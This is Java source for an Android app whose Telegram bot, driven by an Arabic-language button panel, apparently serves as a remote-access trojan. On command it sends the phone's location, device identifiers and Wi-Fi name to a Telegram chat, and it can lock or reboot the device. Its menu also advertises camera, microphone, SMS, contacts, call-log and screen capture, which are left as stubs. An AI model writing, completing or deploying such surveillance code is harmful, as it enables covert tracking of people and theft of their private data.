package com.alzahra.telegram;

import android.content.Context;
import android.util.Log;

import org.json.JSONObject;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.TelegramBotsApi;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.ReplyKeyboardMarkup;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardButton;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardRow;
import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

public class SimpleBot {
    private static final String TAG = "SimpleBot";
    private final String botToken;
    private final String chatId;
    private final Context context;
    private TelegramLongPollingBot bot;
    private boolean running = false;

    public SimpleBot(String token, String chat, Context ctx) {
        this.botToken = token;
        this.chatId = chat;
        this.context = ctx;
    }

    public void start() {
        try {
            TelegramBotsApi api = new TelegramBotsApi(DefaultBotSession.class);
            
            bot = new TelegramLongPollingBot() {
                @Override
                public String getBotToken() {
                    return botToken;
                }

                @Override
                public String getBotUsername() {
                    return "AlZahraBot";
                }

                @Override
                public void onUpdateReceived(Update update) {
                    if (update.hasMessage() && update.getMessage() != null && update.getMessage().hasText()) {
                        handleMessage(update.getMessage().getText(), update.getMessage().getChatId().toString());
                    }
                }
            };
            
            api.registerBot(bot);
            running = true;
            Log.d(TAG, "Bot registered successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Bot registration error: " + e.getMessage());
            throw new RuntimeException(e);
        }
    }
    
    public void stop() {
        running = false;
    }
    
    public boolean isRunning() {
        return running;
    }
    
    private void handleMessage(String text, String fromChatId) {
        if (!fromChatId.equals(chatId)) {
            sendText("⛔ غير مصرح!");
            return;
        }
        
        String cmd = text.toLowerCase().trim();
        Log.d(TAG, "Command: " + cmd);
        
        // الأوامر
        if (cmd.startsWith("/start") || cmd.contains("start") || cmd.contains("تحديث")) {
            sendDashboard();
            return;
        }
        
        if (cmd.contains("موقعي") || cmd.contains("location")) {
            sendLocation();
        }
        else if (cmd.contains("كاميرا") || cmd.contains("camera")) {
            sendText("📸 جاري التقاط الصورة...");
            // TODO: implement camera
        }
        else if (cmd.contains("ميكروفون") || cmd.contains("mic")) {
            sendText("🎤 جاري تسجيل الصوت...");
            // TODO: implement mic
        }
        else if (cmd.contains("معلومات") || cmd.contains("device")) {
            sendDeviceInfo();
        }
        else if (cmd.contains("بطارية") || cmd.contains("battery")) {
            sendBattery();
        }
        else if (cmd.contains("واي فاي") || cmd.contains("wifi")) {
            sendWiFi();
        }
        else if (cmd.contains("رسائل") || cmd.contains("sms")) {
            sendText("💬 جاري جمع الرسائل...");
        }
        else if (cmd.contains("جهات") || cmd.contains("contacts")) {
            sendText("👥 جاري جمع جهات الاتصال...");
        }
        else if (cmd.contains("مكالمات") || cmd.contains("calls")) {
            sendText("📞 جاري جمع سجل المكالمات...");
        }
        else if (cmd.contains("تطبيقات") || cmd.contains("apps")) {
            sendText("📦 جاري جمع قائمة التطبيقات...");
        }
        else if (cmd.contains("ملفات") || cmd.contains("files")) {
            sendText("📁 المسارات:\n/sdcard/Download\n/sdcard/Pictures");
        }
        else if (cmd.contains("شاشة") || cmd.contains("screen")) {
            sendText("📱 جاري التقاط الشاشة...");
        }
        else if (cmd.contains("قفل") || cmd.contains("lock")) {
            lockDevice();
        }
        else if (cmd.contains("فتح") || cmd.contains("unlock")) {
            sendText("🔓 يتطلب صلاحيات إضافية");
        }
        else if (cmd.contains("إعادة") || cmd.contains("restart")) {
            restartDevice();
        }
        else if (cmd.contains("مساعدة") || cmd.contains("help")) {
            sendHelp();
        }
        else {
            sendText("❓ أمر غير معروف\nاكتب /start للوحة التحكم");
            sendDashboard();
        }
    }
    
    public void sendText(String message) {
        new Thread(() -> {
            try {
                String urlStr = "https://api.telegram.org/bot" + botToken + "/sendMessage";
                String params = "chat_id=" + chatId + "&text=" + URLEncoder.encode(message, "UTF-8") + "&parse_mode=Markdown";
                
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.setDoOutput(true);
                
                DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
                wr.write(params.getBytes("UTF-8"));
                wr.flush();
                wr.close();
                
                int response = conn.getResponseCode();
                conn.disconnect();
                Log.d(TAG, "Message sent: " + response);
            } catch (Exception e) {
                Log.e(TAG, "Send error: " + e.getMessage());
            }
        }).start();
    }
    
    public void sendDashboard() {
        new Thread(() -> {
            try {
                String urlStr = "https://api.telegram.org/bot" + botToken + "/sendMessage";
                
                // بناء لوحة المفاتيح
                String keyboardJson = "{" +
                    "\"keyboard\":[" +
                        "[{\"text\":\"📍 موقعي\"},{\"text\":\"📸 كاميرا\"},{\"text\":\"🎤 ميكروفون\"}]," +
                        "[{\"text\":\"📱 معلومات الجهاز\"},{\"text\":\"🔋 البطارية\"},{\"text\":\"📶 واي فاي\"}]," +
                        "[{\"text\":\"💬 الرسائل\"},{\"text\":\"👥 جهات الاتصال\"},{\"text\":\"📞 سجل المكالمات\"}]," +
                        "[{\"text\":\"📦 التطبيقات\"},{\"text\":\"📁 الملفات\"},{\"text\":\"📱 الشاشة\"}]," +
                        "[{\"text\":\"🔒 قفل\"},{\"text\":\"🔓 فتح\"},{\"text\":\"🔄 إعادة تشغيل\"}]," +
                        "[{\"text\":\"❓ مساعدة\"}]" +
                    "]," +
                    "\"resize_keyboard\":true" +
                "}";
                
                String params = "chat_id=" + chatId + 
                    "&text=" + URLEncoder.encode("🎛️ *لوحة التحكم*\nاختر أمر:", "UTF-8") +
                    "&parse_mode=Markdown" +
                    "&reply_markup=" + URLEncoder.encode(keyboardJson, "UTF-8");
                
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setConnectTimeout(10000);
                conn.setDoOutput(true);
                
                DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
                wr.write(params.getBytes("UTF-8"));
                wr.flush();
                wr.close();
                
                conn.getResponseCode();
                conn.disconnect();
                Log.d(TAG, "Dashboard sent");
            } catch (Exception e) {
                Log.e(TAG, "Dashboard error: " + e.getMessage());
            }
        }).start();
    }
    
    private void sendDeviceInfo() {
        try {
            String model = android.os.Build.MODEL;
            String id = android.provider.Settings.Secure.getString(
                context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
            String androidVersion = android.os.Build.VERSION.RELEASE;
            
            sendText("📱 *معلومات الجهاز*\n\n" +
                "📲 الطراز: `" + model + "`\n" +
                "🤖 Android: `" + androidVersion + "`\n" +
                "🔑 المعرف: `" + id.substring(0, Math.min(id.length(), 8)) + "...`");
        } catch (Exception e) {
            sendText("⚠️ خطأ: " + e.getMessage());
        }
    }
    
    private void sendBattery() {
        try {
            android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent battery = context.registerReceiver(null, ifilter);
            int level = battery.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = battery.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            float pct = level * 100 / (float)scale;
            
            String status = pct > 80 ? "🟢 ممتازة" : pct > 50 ? "🟡 جيدة" : "🔴 ضعيفة";
            sendText("🔋 *البطارية*\n\nالمستوى: `" + (int)pct + "%` " + status);
        } catch (Exception e) {
            sendText("⚠️ خطأ");
        }
    }
    
    private void sendWiFi() {
        try {
            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) 
                context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            String ssid = wm.getConnectionInfo().getSSID();
            sendText("📶 *الواي فاي*\n\nالشبكة: " + ssid);
        } catch (Exception e) {
            sendText("⚠️ غير متصل");
        }
    }
    
    private void sendLocation() {
        try {
            android.location.LocationManager lm = (android.location.LocationManager)
                context.getSystemService(Context.LOCATION_SERVICE);
            android.location.Location loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
            
            if (loc != null) {
                sendText("📍 *الموقع*\n\n" +
                    "الخط: `" + loc.getLatitude() + "`\n" +
                    "الطول: `" + loc.getLongitude() + "`\n" +
                    "الدقة: `" + loc.getAccuracy() + " م`\n\n" +
                    "[🗺 الخريطة](https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude() + ")");
            } else {
                sendText("📍 *الموقع*\n\nآخر موقع غير متاح");
            }
        } catch (Exception e) {
            sendText("⚠️ خطأ في الموقع: " + e.getMessage());
        }
    }
    
    private void lockDevice() {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            dpm.lockNow();
            sendText("🔒 *تم قفل الجهاز*");
        } catch (Exception e) {
            sendText("⚠️ فشل القفل: " + e.getMessage());
        }
    }
    
    private void restartDevice() {
        try {
            java.lang.Runtime.getRuntime().exec("su -c reboot");
            sendText("🔄 *جاري إعادة التشغيل...*");
        } catch (Exception e) {
            sendText("⚠️ يتطلب ROOT");
        }
    }
    
    private void sendHelp() {
        sendText("📖 *الأوامر المتاحة:*\n\n" +
            "📍 موقعي - الموقع الجغرافي\n" +
            "📸 كاميرا - التقاط صورة\n" +
            "🎤 ميكروفون - تسجيل صوت\n" +
            "📱 معلومات الجهاز - بيانات الجهاز\n" +
            "🔋 البطارية - حالة البطارية\n" +
            "📶 واي فاي - معلومات الشبكة\n" +
            "💬 الرسائل - SMS\n" +
            "👥 جهات الاتصال - Contacts\n\n" +
            "🎛️ لعرض الأزرار اضغط /start");
    }
}
